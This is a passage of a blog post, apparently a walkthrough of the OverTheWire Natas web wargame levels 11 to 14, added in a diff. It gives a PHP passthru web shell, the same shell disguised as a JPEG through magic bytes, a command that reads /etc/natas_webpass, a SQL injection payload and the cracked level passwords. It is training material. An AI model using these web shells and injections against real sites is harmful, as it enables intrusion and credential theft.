+</span><span style="color:#75715e"></span>    <span style="color:#00a8c8">for</span><span style="color:#111">(</span><span style="color:#111">$i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#111">;</span><span style="color:#111">$i</span><span style="color:#f92672">&lt;</span><span style="color:#75af00">strlen</span><span style="color:#111">(</span><span style="color:#111">$text</span><span style="color:#111">);</span><span style="color:#111">$i</span><span style="color:#f92672">++</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#111">$outText</span> <span style="color:#f92672">.=</span> <span style="color:#111">$text</span><span style="color:#111">[</span><span style="color:#111">$i</span><span style="color:#111">]</span> <span style="color:#f92672">^</span> <span style="color:#111">$key</span><span style="color:#111">[</span><span style="color:#111">$i</span> <span style="color:#f92672">%</span> <span style="color:#75af00">strlen</span><span style="color:#111">(</span><span style="color:#111">$key</span><span style="color:#111">)];</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#00a8c8">return</span> <span style="color:#111">$outText</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">echo</span> <span style="color:#75af00">base64_encode</span><span style="color:#111">(</span><span style="color:#75af00">xor_encrypt</span><span style="color:#111">());</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>From which we get <code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>,
+we change the cookie, refresh the page and get:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+
+Cookies are protected with XOR encryption<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+</code></pre></div><h1 id="level-12">Level 12</h1>
+<p>Arriving to Level 12 we have before us an uploading utility supporting a suspisciously small image size.</p>
+<p>Going to the source code we find:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span> 
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">genRandomString</span><span style="color:#111">()</span> <span style="color:#111">{</span>
+    <span style="color:#111">$length</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span><span style="color:#111">;</span>
+    <span style="color:#111">$characters</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;0123456789abcdefghijklmnopqrstuvwxyz&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">$string</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span><span style="color:#111">;</span>    
+
+    <span style="color:#00a8c8">for</span> <span style="color:#111">(</span><span style="color:#111">$p</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span> <span style="color:#111">$p</span> <span style="color:#f92672">&lt;</span> <span style="color:#111">$length</span><span style="color:#111">;</span> <span style="color:#111">$p</span><span style="color:#f92672">++</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#111">$string</span> <span style="color:#f92672">.=</span> <span style="color:#111">$characters</span><span style="color:#111">[</span><span style="color:#75af00">mt_rand</span><span style="color:#111">(</span><span style="color:#ae81ff">0</span><span style="color:#111">,</span> <span style="color:#75af00">strlen</span><span style="color:#111">(</span><span style="color:#111">$characters</span><span style="color:#111">)</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">)];</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#00a8c8">return</span> <span style="color:#111">$string</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">makeRandomPath</span><span style="color:#111">(</span><span style="color:#111">$dir</span><span style="color:#111">,</span> <span style="color:#111">$ext</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">do</span> <span style="color:#111">{</span>
+        <span style="color:#111">$path</span> <span style="color:#f92672">=</span> <span style="color:#111">$dir</span><span style="color:#f92672">.</span><span style="color:#d88200">&#34;/&#34;</span><span style="color:#f92672">.</span><span style="color:#75af00">genRandomString</span><span style="color:#111">()</span><span style="color:#f92672">.</span><span style="color:#d88200">&#34;.&#34;</span><span style="color:#f92672">.</span><span style="color:#111">$ext</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">while</span><span style="color:#111">(</span><span style="color:#75af00">file_exists</span><span style="color:#111">(</span><span style="color:#111">$path</span><span style="color:#111">));</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">$path</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">makeRandomPathFromFilename</span><span style="color:#111">(</span><span style="color:#111">$dir</span><span style="color:#111">,</span> <span style="color:#111">$fn</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#111">$ext</span> <span style="color:#f92672">=</span> <span style="color:#75af00">pathinfo</span><span style="color:#111">(</span><span style="color:#111">$fn</span><span style="color:#111">,</span> <span style="color:#75af00">PATHINFO_EXTENSION</span><span style="color:#111">);</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#75af00">makeRandomPath</span><span style="color:#111">(</span><span style="color:#111">$dir</span><span style="color:#111">,</span> <span style="color:#111">$ext</span><span style="color:#111">);</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;filename&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_POST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$target_path</span> <span style="color:#f92672">=</span> <span style="color:#75af00">makeRandomPathFromFilename</span><span style="color:#111">(</span><span style="color:#d88200">&#34;upload&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_POST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;filename&#34;</span><span style="color:#111">]);</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">filesize</span><span style="color:#111">(</span><span style="color:#111">$_FILES</span><span style="color:#111">[</span><span style="color:#d88200">&#39;uploadedfile&#39;</span><span style="color:#111">][</span><span style="color:#d88200">&#39;tmp_name&#39;</span><span style="color:#111">])</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;File is too big&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">move_uploaded_file</span><span style="color:#111">(</span><span style="color:#111">$_FILES</span><span style="color:#111">[</span><span style="color:#d88200">&#39;uploadedfile&#39;</span><span style="color:#111">][</span><span style="color:#d88200">&#39;tmp_name&#39;</span><span style="color:#111">],</span> <span style="color:#111">$target_path</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+            <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;The file &lt;a href=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">$target_path\</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#111">$target_path</span><span style="color:#f92672">&lt;/</span><span style="color:#75af00">a</span><span style="color:#f92672">&gt;</span> <span style="color:#75af00">has</span> <span style="color:#75af00">been</span> <span style="color:#75af00">uploaded</span><span style="color:#d88200">&#34;;
+</span><span style="color:#d88200">        } else{
+</span><span style="color:#d88200">            echo &#34;</span><span style="color:#75af00">There</span> <span style="color:#75af00">was</span> <span style="color:#75af00">an</span> <span style="color:#75af00">error</span> <span style="color:#75af00">uploading</span> <span style="color:#75af00">the</span> <span style="color:#75af00">file</span><span style="color:#111">,</span> <span style="color:#75af00">please</span> <span style="color:#00a8c8">try</span> <span style="color:#75af00">again</span><span style="color:#f92672">!</span><span style="color:#d88200">&#34;;
+</span><span style="color:#d88200">        }
+</span><span style="color:#d88200">    }
+</span><span style="color:#d88200">} else {
+</span><span style="color:#d88200">?&gt;
+</span><span style="color:#d88200">    &lt;form enctype=&#34;</span><span style="color:#75af00">multipart</span><span style="color:#f92672">/</span><span style="color:#75af00">form</span><span style="color:#f92672">-</span><span style="color:#75af00">data</span><span style="color:#d88200">&#34; action=&#34;</span><span style="color:#75af00">index</span><span style="color:#f92672">.</span><span style="color:#75af00">php</span><span style="color:#d88200">&#34; method=&#34;</span><span style="color:#75af00">POST</span><span style="color:#d88200">&#34;&gt;
+</span><span style="color:#d88200">    &lt;input type=&#34;</span><span style="color:#75af00">hidden</span><span style="color:#d88200">&#34; name=&#34;</span><span style="color:#75af00">MAX_FILE_SIZE</span><span style="color:#d88200">&#34; value=&#34;</span><span style="color:#ae81ff">1000</span><span style="color:#d88200">&#34; /&gt;
+</span><span style="color:#d88200">    &lt;input type=&#34;</span><span style="color:#75af00">hidden</span><span style="color:#d88200">&#34; name=&#34;</span><span style="color:#75af00">filename</span><span style="color:#d88200">&#34; value=&#34;</span><span style="color:#f92672">&lt;?</span> <span style="color:#00a8c8">print</span> <span style="color:#75af00">genRandomString</span><span style="color:#111">();</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">.jpg&#34; /&gt;
+</span><span style="color:#960050;background-color:#1e0010">    Choose a JPEG to upload (max 1KB):&lt;br/&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;input name=&#34;uploadedfile&#34; type=&#34;file&#34; /&gt;&lt;br /&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;input type=&#34;submit&#34; value=&#34;Upload File&#34; /&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;/form&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;? } ?&gt; 
+</span></code></pre></div><p>Upon inspection, all functions only generate random names, the interesting part starts with the <code>if</code>, with a quick analysis we can see that it:</p>
+<ul>
+<li>Checks if <code>filename</code> is present in the request
+<ul>
+<li>Checks if the file size
+<ul>
+<li>Tries to move the file to it&rsquo;s final location</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>If the <code>filename</code> is not present, it generates a filename for the future upload and appends <code>.jpg</code> to it!</li>
+</ul>
+<p>So lets try to upload a PHP script, but before, lets change that <code>.jpg</code> to <code>.php</code>, otherwise the server will try to read it as a JPEG.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;hidden&#34;</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;filename&#34;</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;6jhtalz54t.jpg&#34;</span><span style="color:#111">&gt;</span> 
+</code></pre></div><p>Becomes (your filename is probably different):</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;hidden&#34;</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;filename&#34;</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;6jhtalz54t.php&#34;</span><span style="color:#111">&gt;</span> 
+</code></pre></div><p>Moving on to the script, we already know from experience that <code>passthru</code> lets us execute commands on the system,
+we will use it with <a href="https://www.php.net/manual/en/reserved.variables.request.php"><code>$_REQUEST</code></a> in order to gain a shell like access through a query parameter.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#75af00">php</span> <span style="color:#00a8c8">echo</span> <span style="color:#75af00">passthru</span><span style="color:#111">(</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;cmd&#34;</span><span style="color:#111">]);</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>One line of PHP does the trick, no need to get fancy.
+Now, when you upload your PHP you can use <code>cmd</code> to run a command and get the result displayed!</p>
+<p>Like:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">?cmd<span style="color:#f92672">=</span>ls <span style="color:#75715e"># will print the directory contents</span>
+</code></pre></div><p>So our command will be the always loyal <code>cat /etc/natas_webpass/natas13</code>,
+running <code>http://natas12.natas.labs.overthewire.org/upload/6jhtalz54t.php?cmd=cat /etc/natas_webpass/natas13</code> will get you the password <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code>!</p>
+<h1 id="level-13">Level 13</h1>
+<p>This challenge is the same as before however we see <code>For security reasons, we now only accept image files!</code></p>
+<p>Let&rsquo;s look into the source code:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;filename&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_POST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$target_path</span> <span style="color:#f92672">=</span> <span style="color:#75af00">makeRandomPathFromFilename</span><span style="color:#111">(</span><span style="color:#d88200">&#34;upload&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_POST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;filename&#34;</span><span style="color:#111">]);</span>
+    
+    <span style="color:#111">$err</span><span style="color:#f92672">=</span><span style="color:#111">$_FILES</span><span style="color:#111">[</span><span style="color:#d88200">&#39;uploadedfile&#39;</span><span style="color:#111">][</span><span style="color:#d88200">&#39;error&#39;</span><span style="color:#111">];</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$err</span><span style="color:#111">){</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$err</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">2</span><span style="color:#111">){</span>
+            <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;The uploaded file exceeds MAX_FILE_SIZE&#34;</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span> <span style="color:#00a8c8">else</span><span style="color:#111">{</span>
+            <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Something went wrong :/&#34;</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">filesize</span><span style="color:#111">(</span><span style="color:#111">$_FILES</span><span style="color:#111">[</span><span style="color:#d88200">&#39;uploadedfile&#39;</span><span style="color:#111">][</span><span style="color:#d88200">&#39;tmp_name&#39;</span><span style="color:#111">])</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;File is too big&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#00a8c8">if</span> <span style="color:#111">(</span><span style="color:#f92672">!</span> <span style="color:#75af00">exif_imagetype</span><span style="color:#111">(</span><span style="color:#111">$_FILES</span><span style="color:#111">[</span><span style="color:#d88200">&#39;uploadedfile&#39;</span><span style="color:#111">][</span><span style="color:#d88200">&#39;tmp_name&#39;</span><span style="color:#111">]))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;File is not an image&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">move_uploaded_file</span><span style="color:#111">(</span><span style="color:#111">$_FILES</span><span style="color:#111">[</span><span style="color:#d88200">&#39;uploadedfile&#39;</span><span style="color:#111">][</span><span style="color:#d88200">&#39;tmp_name&#39;</span><span style="color:#111">],</span> <span style="color:#111">$target_path</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+            <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;The file &lt;a href=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">$target_path\</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#111">$target_path</span><span style="color:#f92672">&lt;/</span><span style="color:#75af00">a</span><span style="color:#f92672">&gt;</span> <span style="color:#75af00">has</span> <span style="color:#75af00">been</span> <span style="color:#75af00">uploaded</span><span style="color:#d88200">&#34;;
+</span><span style="color:#d88200">        } else{
+</span><span style="color:#d88200">            echo &#34;</span><span style="color:#75af00">There</span> <span style="color:#75af00">was</span> <span style="color:#75af00">an</span> <span style="color:#75af00">error</span> <span style="color:#75af00">uploading</span> <span style="color:#75af00">the</span> <span style="color:#75af00">file</span><span style="color:#111">,</span> <span style="color:#75af00">please</span> <span style="color:#00a8c8">try</span> <span style="color:#75af00">again</span><span style="color:#f92672">!</span><span style="color:#d88200">&#34;;
+</span><span style="color:#d88200">        }
+</span><span style="color:#d88200">    }
+</span><span style="color:#d88200">}
+</span></code></pre></div><p>This part changed and we can see <code>exif_imagetype($_FILES['uploadedfile']['tmp_name'])</code> is now if the file is an image (just like they said).
+So we need to make our PHP script pretend it is an image.</p>
+<blockquote>
+<p>Use your favorite way to edit byte arrays, Python, Hex Editors, Jumper Cables, etc</p>
+</blockquote>
+<p>Breaking down our script into bytes we get:</p>
+<pre><code>3C 3F 70 68 70 20 65 63 
+68 6F 20 70 61 73 73 74 
+68 72 75 28 24 5F 52 45 
+51 55 45 53 54 5B 22 63 
+6D 64 22 5D 29 3B 20 3F 
+3E
+</code></pre><p>In order to add the <code>.jpg</code> magic numbers we add four characters to the beginning.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">....&lt;?</span><span style="color:#75af00">php</span> <span style="color:#00a8c8">echo</span> <span style="color:#75af00">passthru</span><span style="color:#111">(</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;cmd&#34;</span><span style="color:#111">]);</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Which broken into bytes is:</p>
+<pre><code>2E 2E 2E 2E 3C 3F 70 68 
+70 20 65 63 68 6F 20 70 
+61 73 73 74 68 72 75 28 
+24 5F 52 45 51 55 45 53 
+54 5B 22 63 6D 64 22 5D 
+29 3B 20 3F 3E
+</code></pre><p>Now, we need to edit the first bytes to be <code>FF D8 FF DB</code>, getting us:</p>
+<pre><code>FF D8 FF DB 3C 3F 70 68 
+70 20 65 63 68 6F 20 70 
+61 73 73 74 68 72 75 28 
+24 5F 52 45 51 55 45 53 
+54 5B 22 63 6D 64 22 5D 
+29 3B 20 3F 3E
+</code></pre><p>Let&rsquo;s test if our script works! We can do it using <code>file</code> on Linux</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file script.php
+script.php: JPEG image data
+</code></pre></div><p>We got it! Time to upload the script repeating the same process as Level 12. Edit the HTML so the file will get uploaded as <code>.php</code> and repeat the process!</p>
+<p>We get <code>����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>, removing the first 4 bytes we get the password!</p>
+<h1 id="level-14">Level 14</h1>
+<p>Thirteen down! Only, 20 more to go&hellip;
+Let&rsquo;s get to work then!</p>
+<p>We are greeted with a login prompt and the link to its source code.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$link</span> <span style="color:#f92672">=</span> <span style="color:#75af00">mysql_connect</span><span style="color:#111">(</span><span style="color:#d88200">&#39;localhost&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;natas14&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;&lt;censored&gt;&#39;</span><span style="color:#111">);</span>
+    <span style="color:#75af00">mysql_select_db</span><span style="color:#111">(</span><span style="color:#d88200">&#39;natas14&#39;</span><span style="color:#111">,</span> <span style="color:#111">$link</span><span style="color:#111">);</span>
+    
+    <span style="color:#111">$query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;SELECT * from users where username=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">.</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#d88200">&#34;</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200"> and password=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">.</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;password&#34;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#d88200">&#34;</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;debug&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_GET</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Executing query: </span><span style="color:#d88200">$query</span><span style="color:#d88200">&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">mysql_num_rows</span><span style="color:#111">(</span><span style="color:#75af00">mysql_query</span><span style="color:#111">(</span><span style="color:#111">$query</span><span style="color:#111">,</span> <span style="color:#111">$link</span><span style="color:#111">))</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Access denied!&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+    <span style="color:#75af00">mysql_close</span><span style="color:#111">(</span><span style="color:#111">$link</span><span style="color:#111">);</span>
+<span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Straight up we see some SQL!</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#111">$query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;SELECT * from users where username=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">.</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#d88200">&#34;</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200"> and password=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">.</span><span style="color:#111">$_REQUEST</span>
+</code></pre></div><p>And then this:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">mysql_num_rows</span><span style="color:#111">(</span><span style="color:#75af00">mysql_query</span><span style="color:#111">(</span><span style="color:#111">$query</span><span style="color:#111">,</span> <span style="color:#111">$link</span><span style="color:#111">))</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+<span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Access denied!&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+</code></pre></div><p>So this should be a SQL Injection attack.</p>
+<p>Let&rsquo;s start by looking at the query, in plain SQL it looks like this.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00a8c8">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#00a8c8">FROM</span> <span style="color:#111">users</span> <span style="color:#00a8c8">WHERE</span> <span style="color:#111">username</span><span style="color:#f92672">=?</span> <span style="color:#00a8c8">AND</span> <span style="color:#111">password</span><span style="color:#f92672">=?</span>
+</code></pre></div><p>However there is no input sanitization, so we start by breaking it with a simple <code>&quot;</code> (use the debug flag for a better understanding of what is going on).</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://natas14.natas.labs.overthewire.org/index.php?debug&amp;username=&#34;
+</span></code></pre></div><p>We receive the following error message:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Notice: Undefined index: password in /var/www/natas/natas14/index.php on line 19
+Executing query: SELECT * from users where username=&#34;&#34;&#34; and password=&#34;&#34;
+
+Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
+Access denied!
+</code></pre></div><p>We sucessfully broke the query!
+Moving on to textbook SQLi.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://natas14.natas.labs.overthewire.org/index.php?debug&amp;username=natas15&amp;password=&#34; or 1=1 #
+</span></code></pre></div><p><em>Note: use the url escaped form of the query or else it won&rsquo;t work</em></p>
+<p>The query as seen by the server is:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00a8c8">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#00a8c8">from</span> <span style="color:#111">users</span> <span style="color:#00a8c8">where</span> <span style="color:#111">username</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;natas15&#34;</span> <span style="color:#00a8c8">and</span> <span style="color:#111">password</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;&#34;</span> <span style="color:#00a8c8">or</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">#</span><span style="color:#d88200">&#34;
+</span></code></pre></div><p>You might be thinking why the query evaluates to <code>true</code> given that there is no user with an empty password, or so we assume.</p>
+<p>Looking at the MySQL documentation for <a href="https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html">operator precedence</a>, we see <code>AND</code> has an higher precedence than <code>OR</code>, which results in the following AST.</p>
+<p><img src="/otw_natas/level14.svg" alt="Logical AST"></p>
+<p>This way we can see the <code>AND</code> gets evaluated first and the <code>OR</code> afterwards, resulting in <code>TRUE</code> for all collumns.</p>
+<p>Finally we get:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+</code></pre></div><h1 id="level-15">Level 15</h1>
+<p>This time, there is no login, we can check if a user exists and that is it!</p>
+<p>We start by checking if <code>natas16</code> exists, we see that it does and we move to the source code.</p>
